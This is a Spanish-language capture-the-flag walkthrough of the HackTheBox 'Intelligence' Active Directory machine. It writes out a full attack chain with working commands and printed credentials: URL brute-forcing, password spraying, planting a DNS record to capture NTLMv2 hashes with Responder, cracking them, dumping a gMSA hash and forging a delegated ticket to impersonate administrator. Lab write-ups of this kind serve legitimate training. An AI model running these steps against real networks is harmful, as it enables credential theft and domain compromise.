 
# Máquina "Intelligence" de HackTheBox

## Características:

- Windows  
- Media 
- Active Directory  
- Information Leakage 
- Kerberos Enumeration (Kerbrute) 
- Creating a DNS Record (dnstool.py) [Abusing ADIDNS] 
- Intercepting Net-NTLMv2 Hashes with Responder 
- BloodHound Enumeration 
- Abusing ReadGMSAPassword Rights (gMSADumper) 
- Pywerview Usage 
- Abusing Unconstrained Delegation 
- Abusing AllowedToDelegate Rights (getST.py) (User Impersonation) Using .ccache file with wmiexec.py (KRB5CCNAME) Active Directory

## Útil en:

- OSCP 
- OSEP 
- Active Directory

## Reconocimiento

IP: 10.10.10.248

Escaneo inicial:
```bash
nmap -p- -oA scans/nmap-alltcp 10.10.10.248
```

Resultados:
```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49667/tcp open  unknown
49702/tcp open  unknown
49714/tcp open  unknown
51596/tcp open  unknown
```

Escaneo más detallado:
```bash
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,9389 -sCV -oA scans/nmap-tcpscripts 10.10.10.248
```

Resultados:
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-08-13 08:43:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-13T08:44:54+00:00; +7h03m18s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-13T08:44:54+00:00; +7h03m18s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-13T08:44:54+00:00; +7h03m18s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-13T08:44:54+00:00; +7h03m18s from scanner time.
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h03m17s, deviation: 0s, median: 7h03m17s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-08-13T08:44:15
|_  start_date: N/A
```

Podemos ver muchos puertos abiertos, los resultados sugieren que el host es el controlador de dominio del dominio intelligence.htb. Vemos 4 servidores web en los puertos 80, 593, 5985 y 49691. También en la parte inferior podemos ver que hay una diferencia con la víctima de 7 horas entre nuestro host y el host de destino.

Agregaremos los dominios encontrados al /etc/hosts:
```
intelligence.htb
dc.intelligence.htb
```

Comenzaremos con los dos servidores web que no manejan entradas a procedimientos remotos (RPC), ya que las aplicaciones web suelen constituir una superficie de ataque mayor que otros servicios.

![Port 80](/secciones/posts/imagenes/intelligence/port80.png)

![Port 5985](/secciones/posts/imagenes/intelligence/port5985.png)

Si nos desplazamos hacia abajo, también podemos encontrar un servicio de suscripción y dos botones de descarga. Los botones de descarga enlazan a las páginas:
- http://10.10.10.248/documents/2020-01-01-upload.pdf
- http://10.10.10.248/documents/2020-12-15-upload.pdf

Que son dos archivos PDF que contienen información poco interesante. Algo que podemos tener en mente es que los únicos caracteres impredecibles son los caracteres de la fecha de carga. Podríamos sospechar que otros archivos podrían haberse subido en otras fechas. Adivinar manualmente puede ser una tarea tediosa, así que haremos un script en Python:

```python
import datetime, requests

# Parameters
baseURL = "http://10.10.10.248/"
start = datetime.datetime(2019,1,1)
stop = datetime.datetime(2022,1,1)

# Create a list of dates between the start and stop date
numdays = (stop - start).days
dates = [start + datetime.timedelta(days=ndays) for ndays in range(numdays)]
dates = [date.strftime("%Y-%m-%d") for date in dates]

# Attempt to download a PDF for each date
for date in dates:
    print(date, end="\r")
    URL = baseURL+"documents/"+date+"-upload.pdf"
    response = requests.get(URL)

    if response.status_code == 200:
        filename = "./"+date+".pdf"
        print("[*] PDF Found! Downloading " + URL + " to " + filename)
        with open(filename, 'wb') as f:
            f.write(response.content)
```

La ejecución del script genera una gran cantidad de archivos PDF identificados. Para cada PDF, hay dos cosas que podemos comprobar: los metadatos y el contenido real del PDF. Podemos extraer metadatos de archivos PDF usando exiftool:

```bash
exiftool 2020-01-01.pdf
exiftool *.pdf | grep "Creator"
```

Podemos crear una lista de nombres de usuario:
```bash
exiftool *.pdf | grep "Creator" | awk -F ":" '{gsub(/ /,""); print $2}' > users.txt
head users.txt
```

Para inspeccionar el contenido, podemos usar abiword:
```bash
abiword --to=txt --to-name=fd://1 2020-01-01.pdf
```

Buscamos información interesante:
```bash
abiword --to=txt --to-name=fd://1 *.pdf | grep -C 5 "password"
```

Encontramos que `NewIntelligenceCorpUser9876` es una contraseña predeterminada que los usuarios deben cambiar después de iniciar sesión.

## Explotación

Verificamos si algún usuario no cambió la contraseña con crackmapexec:
```bash
crackmapexec smb 10.10.10.248 -u users.txt -p NewIntelligenceCorpUser9876
```

Descubrimos que `tiffany.Molina` aún no cambió su password.

Verificamos los recursos compartidos SMB:
```bash
crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares
smbclient \\\\10.10.10.248\\IT -U Tiffany.Molina%NewIntelligenceCorpUser9876
get downdetector.ps1
```

Analizamos el script downdetector.ps1:
```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
    try {
        $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
        if(.StatusCode -ne 200) {
            Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
        }
    } catch {}
}
```

## Abuso de ADIDNS

Usamos dnstool.py para agregar un registro DNS malicioso:
```bash
python3 dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web-evil --data 10.10.16.4 --type A 10.10.10.248
```

Interceptamos el hash NTLMv2 con Responder:
```bash
sudo responder -I tun0
```

Crackeamos el hash con hashcat:
```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

Obtenemos la contraseña: `Mr.Teddy`

## Movimiento Lateral con BloodHound

Extraemos información de AD con BloodHound:
```bash
bloodhound-python -c ALL -u TED.GRAVES -p Mr.Teddy -d intelligence.htb -dc intelligence.htb -ns 10.10.10.248
```

![BloodHound Owned](/secciones/posts/imagenes/intelligence/bOwned.png)
![BloodHound Shortest Path](/secciones/posts/imagenes/intelligence/bShortest.png)
![BloodHound Delegation](/secciones/posts/imagenes/intelligence/dellegate.png)

## Escalada de Privilegios

Extraemos el hash de la cuenta SVC_INT:
```bash
python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb
```

Obtenemos el hash: `a5fd76c71109b0b483abe309fbc92ccb`

Sincronizamos el tiempo:
```bash
sudo timedatectl set-ntp 0
date && sudo ntpdate -s intelligence.htb && date
```

Obtenemos un TGT para administrator:
```bash
impacket-getST -spn www/dc.intelligence.htb -hashes :a5fd76c71109b0b483abe309fbc92ccb -dc-ip 10.10.10.248 -impersonate administrator intelligence.htb/svc_int
```

Accedemos como administrator:
```bash
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass administrator@dc.intelligence.htb
whoami
```

¡Hemos comprometido exitosamente el dominio!
 
 